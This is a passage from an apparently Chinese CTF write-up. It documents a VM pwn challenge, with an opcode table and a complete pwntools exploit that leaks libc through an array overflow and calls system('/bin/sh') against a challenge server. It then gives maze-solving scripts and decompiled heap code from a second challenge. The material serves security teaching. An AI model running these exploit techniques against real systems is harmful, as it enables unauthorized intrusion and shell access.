<h4 id="3-运算指令"><a href="#3-运算指令" class="headerlink" title="3. 运算指令"></a><strong>3. 运算指令</strong></h4><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">指令名称</th>
<th align="center">参数</th>
<th align="center">功能描述</th>
<th align="center">对应代码位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>0x0A</strong></td>
<td align="center"><code>ADD</code></td>
<td align="center"><code>目标寄存器</code></td>
<td align="center">对目标寄存器做加法（<code>reg[v9] += sub_132C(reg)</code>）</td>
<td align="center"><code>case 0xAu</code></td>
</tr>
<tr>
<td align="center"><strong>0x0B</strong></td>
<td align="center"><code>SUB</code></td>
<td align="center"><code>目标寄存器</code></td>
<td align="center">对目标寄存器做减法（<code>reg[v8] -= sub_132C(reg)</code>）</td>
<td align="center"><code>case 0xBu</code></td>
</tr>
</tbody></table>
<h4 id="4-高级操作"><a href="#4-高级操作" class="headerlink" title="4. 高级操作"></a><strong>4. 高级操作</strong></h4><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">指令名称</th>
<th align="center">参数</th>
<th align="center">功能描述</th>
<th align="center">对应代码位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>0x05</strong></td>
<td align="center"><code>PUSH</code></td>
<td align="center"><code>值</code></td>
<td align="center">将值压入栈（通过<code>sub_1432</code>实现栈增长）</td>
<td align="center"><code>case 5u</code></td>
</tr>
<tr>
<td align="center"><strong>0x06</strong></td>
<td align="center"><code>CALL_FUNCTION</code></td>
<td align="center"><code>函数指针</code></td>
<td align="center">调用外部函数（<code>v14(*reg)</code>执行函数指针）</td>
<td align="center"><code>case 6u</code></td>
</tr>
</tbody></table>
<p>在\x01和\x02存在数组溢出，got表不可写，先获得data段0x4008的地址此处指向是base+0x4008，可以间接计算got</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-02 17:17:51</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,gdbscript)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	b *$rebase(0x14F3)\nb *$rebase(0x15ac)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\x00: mov reg[op2],num ---&gt; heap_ptr+pc</span></span><br><span class="line"><span class="string">\x01: mov reg[op3],[mem]---&gt;*reg[op2]</span></span><br><span class="line"><span class="string">\x02: mov [mem]---&gt;*reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x03: mov reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x04: push</span></span><br><span class="line"><span class="string">\x05: pop</span></span><br><span class="line"><span class="string">\x06: call---&gt;op3(reg[0])函数调用</span></span><br><span class="line"><span class="string">\x07: ret ---&gt; pop ip</span></span><br><span class="line"><span class="string">\x08: exit</span></span><br><span class="line"><span class="string">\x09: nop</span></span><br><span class="line"><span class="string">\x0a: add reg[op2],num</span></span><br><span class="line"><span class="string">\x0b: sub reg[op2],num</span></span><br><span class="line"><span class="string">op2均为src，op3均为dst</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># \x00</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0</span>, reg, num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x01</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_indirect</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">1</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x02</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store_indirect</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">2</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x03</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_reg</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">3</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x04: push</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">4</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x05: pop</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">5</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x06: call</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_call</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">6</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x08: exit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_vm</span>():</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;b&quot;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x0a: add</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0xA</span>, reg, num)<span class="comment">#num要用做地址计算，用8字节类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x0b: sub</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0xB</span>, reg, num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先获得data段0x4008的地址此处指向是base+0x4008，可以间接计算got</span></span><br><span class="line">payload = load_indirect(-<span class="number">11</span>, <span class="number">1</span>) + sub_num(<span class="number">1</span>, <span class="number">0x50</span>) + load_indirect(<span class="number">1</span>, <span class="number">0</span>) + sub_num(<span class="number">0</span>, libc.sym[<span class="string">&quot;malloc&quot;</span>]) + mov_reg(<span class="number">0</span>, <span class="number">2</span>) </span><br><span class="line">payload += add_num(<span class="number">2</span>, libc.sym[<span class="string">&quot;system&quot;</span>]) + add_num(<span class="number">0</span>, <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))) + func_call(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#payload += exit_vm()</span></span><br><span class="line"><span class="comment">#debug(&quot;b *$rebase(0x14F3)\nb *$rebase(0x15ac)&quot;)</span></span><br><span class="line">sla(<span class="string">&quot;bytecode: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="迷途之子"><a href="#迷途之子" class="headerlink" title="迷途之子"></a>迷途之子</h2><h3 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_maze</span>():</span><br><span class="line">    start_addr = <span class="number">0x4040</span>  <span class="comment"># 迷宫起始地址</span></span><br><span class="line">    size = <span class="number">0x10000</span>       <span class="comment"># 256x256=65536字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取二进制数据</span></span><br><span class="line">    maze_data = idc.get_bytes(start_addr, size)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;maze.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(maze_data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Maze dumped to maze.bin (<span class="subst">&#123;size&#125;</span> bytes)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dump_maze()</span><br></pre></td></tr></table></figure>

<p>可以得到二进制文件maze.bin，然后通过下面脚本可以获取maze.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;maze.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    maze = f.read()</span><br><span class="line"></span><br><span class="line">width = <span class="number">256</span></span><br><span class="line">height = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;maze.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        row = maze[y*width:(y+<span class="number">1</span>)*width]</span><br><span class="line">        out.write(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> c != <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> row]) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="BFS算法走到终点"><a href="#BFS算法走到终点" class="headerlink" title="BFS算法走到终点"></a>BFS算法走到终点</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_maze</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从文件中读取迷宫数据&quot;&quot;&quot;</span></span><br><span class="line">    maze = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="comment"># 去除换行符和空格，只保留01字符</span></span><br><span class="line">                cleaned_line = line.strip().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="comment"># 跳过空行</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(cleaned_line) &gt; <span class="number">0</span>:</span><br><span class="line">                    maze.append(cleaned_line)</span><br><span class="line">        <span class="keyword">return</span> maze</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：文件&#x27;<span class="subst">&#123;filename&#125;</span>&#x27;未找到&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bfs_solve_maze</span>(<span class="params">maze</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用BFS算法解决迷宫问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 验证迷宫有效性</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> maze <span class="keyword">or</span> <span class="built_in">len</span>(maze) &lt; <span class="number">129</span> <span class="keyword">or</span> <span class="built_in">len</span>(maze[<span class="number">0</span>]) &lt; <span class="number">129</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误：迷宫尺寸不足或数据无效&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    rows = <span class="built_in">len</span>(maze)</span><br><span class="line">    cols = <span class="built_in">len</span>(maze[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义起点(0,0)和终点(128,128)</span></span><br><span class="line">    start = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    end = (<span class="number">128</span>, <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查起点和终点合法性</span></span><br><span class="line">    <span class="keyword">if</span> (maze[start[<span class="number">1</span>]][start[<span class="number">0</span>]] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span>   <span class="comment"># 注意坐标是(x,y)，maze[y][x]</span></span><br><span class="line">        maze[end[<span class="number">1</span>]][end[<span class="number">0</span>]] != <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误：起点或终点不可达&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># BFS初始化</span></span><br><span class="line">    queue = deque()</span><br><span class="line">    queue.append( (start[<span class="number">0</span>], start[<span class="number">1</span>], <span class="string">&quot;&quot;</span>) )  <span class="comment"># (x, y, path)</span></span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    visited.add( (start[<span class="number">0</span>], start[<span class="number">1</span>]) )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 移动方向定义（wasd对应标准方向键）</span></span><br><span class="line">    directions = [</span><br><span class="line">        (<span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>, -<span class="number">1</span>),  <span class="comment"># 上</span></span><br><span class="line">        (<span class="string">&#x27;s&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>),   <span class="comment"># 下</span></span><br><span class="line">        (<span class="string">&#x27;a&#x27;</span>, -<span class="number">1</span>, <span class="number">0</span>),  <span class="comment"># 左</span></span><br><span class="line">        (<span class="string">&#x27;d&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>)    <span class="comment"># 右</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行BFS搜索</span></span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        x, y, path = queue.popleft()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 到达终点</span></span><br><span class="line">        <span class="keyword">if</span> x == end[<span class="number">0</span>] <span class="keyword">and</span> y == end[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历所有可能方向</span></span><br><span class="line">        <span class="keyword">for</span> direction <span class="keyword">in</span> directions:</span><br><span class="line">            move, dx, dy = direction</span><br><span class="line">            nx = x + dx</span><br><span class="line">            ny = y + dy</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 验证新位置有效性</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt;= nx &lt; cols <span class="keyword">and</span> </span><br><span class="line">                <span class="number">0</span> &lt;= ny &lt; rows <span class="keyword">and</span></span><br><span class="line">                maze[ny][nx] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> </span><br><span class="line">                (nx, ny) <span class="keyword">not</span> <span class="keyword">in</span> visited):</span><br><span class="line">                </span><br><span class="line">                visited.add( (nx, ny) )</span><br><span class="line">                queue.append( (nx, ny, path + move) )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 无解情况</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 读取迷宫文件</span></span><br><span class="line">    maze = read_maze(<span class="string">&#x27;maze.txt&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> maze:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解决迷宫问题</span></span><br><span class="line">    solution = bfs_solve_maze(maze)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> solution:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;找到解决方案！操作序列：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法到达终点&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="find-py"><a href="#find-py" class="headerlink" title="find.py"></a>find.py</h3><p>从任意x,y走向任意a,b所需的步的记录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_maze</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        maze = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> <span class="built_in">len</span>(line.strip()) == <span class="number">256</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(maze) != <span class="number">256</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid maze dimensions&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> maze</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">maze, start, end</span>):</span><br><span class="line">    directions = &#123;</span><br><span class="line">        <span class="string">&#x27;w&#x27;</span>: (<span class="number">0</span>, -<span class="number">1</span>), </span><br><span class="line">        <span class="string">&#x27;s&#x27;</span>: (<span class="number">0</span>, <span class="number">1</span>),   </span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: (-<span class="number">1</span>, <span class="number">0</span>),  </span><br><span class="line">        <span class="string">&#x27;d&#x27;</span>: (<span class="number">1</span>, <span class="number">0</span>)    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    visited = [[<span class="literal">False</span>]*<span class="number">256</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    q = deque()</span><br><span class="line">    q.append((start[<span class="number">0</span>], start[<span class="number">1</span>], []))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> q:</span><br><span class="line">        x, y, path = q.popleft()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (x, y) == end:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> move, (dx, dy) <span class="keyword">in</span> directions.items():</span><br><span class="line">            nx = x + dx</span><br><span class="line">            ny = y + dy</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= nx &lt; <span class="number">256</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= ny &lt; <span class="number">256</span>:</span><br><span class="line">                <span class="keyword">if</span> maze[ny][nx] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> visited[ny][nx]:</span><br><span class="line">                    visited[ny][nx] = <span class="literal">True</span></span><br><span class="line">                    q.append((nx, ny, path + [move]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 坐标转换（注意y坐标对应行号）</span></span><br><span class="line">start_x = <span class="number">0xd0</span></span><br><span class="line">start_y = <span class="number">0x92</span></span><br><span class="line">end_x = <span class="number">0xda</span> <span class="comment">#da</span></span><br><span class="line">end_y = <span class="number">0x92</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    maze = read_maze(<span class="string">&quot;maze.txt&quot;</span>)</span><br><span class="line">    path = find_path(maze, (start_x, start_y), (end_x, end_y))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> path:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found path:&quot;</span>, <span class="string">&#x27;&#x27;</span>.join(path))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No path found&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="game"><a href="#game" class="headerlink" title="game()"></a>game()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">start_game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+Bh] [rbp-15h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 chunk0; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 chunk0_1; <span class="comment">// [rsp+Dh] [rbp-13h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 x; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 y; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *chunk0_ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  chunk0_ptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( users[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk0_ptr = users[<span class="number">0</span>];                      <span class="comment">// chunk0_ptr</span></span><br><span class="line">    chunk0 = *users[<span class="number">0</span>];                         <span class="comment">// 0xd0</span></span><br><span class="line">    chunk0_1 = *(users[<span class="number">0</span>] + <span class="number">1</span>);                 <span class="comment">// 0x92</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Game started! (WASD to move, Q to quit)\n&quot;</span>, <span class="number">0x27u</span>LL);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">      x = chunk0;</span><br><span class="line">      y = chunk0_1;</span><br><span class="line">      <span class="keyword">switch</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> ( x )</span><br><span class="line">            --x;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> ( x != <span class="number">0xFF</span> )</span><br><span class="line">            ++x;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">          <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v7;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> ( y != <span class="number">0xFF</span> )</span><br><span class="line">            ++y;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> ( y )</span><br><span class="line">            --y;</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="keyword">if</span> ( !maze[<span class="number">256</span> * y + x] )</span><br><span class="line">          &#123;</span><br><span class="line">            chunk0 = x;<span class="comment">//在这里会向chunk0的fd最低一字节处写值</span></span><br><span class="line">            chunk0_1 = y;<span class="comment">//在这里会向chunk0的fd最低二字节处写值</span></span><br><span class="line">            *chunk0_ptr = x;</span><br><span class="line">            chunk0_ptr[<span class="number">1</span>] = chunk0_1;</span><br><span class="line">            <span class="keyword">if</span> ( chunk0 == goal_x &amp;&amp; chunk0_1 == goal_y )</span><br><span class="line">              gift();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="del"><a href="#del" class="headerlink" title="del()"></a>del()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">del_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Index: &quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Invalid index.\n&quot;</span>, <span class="number">0xFu</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !used_flags[v1] )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;User not exists.\n&quot;</span>, <span class="number">0x11u</span>LL);</span><br><span class="line">  <span class="built_in">free</span>(users[v1]);                              <span class="comment">// 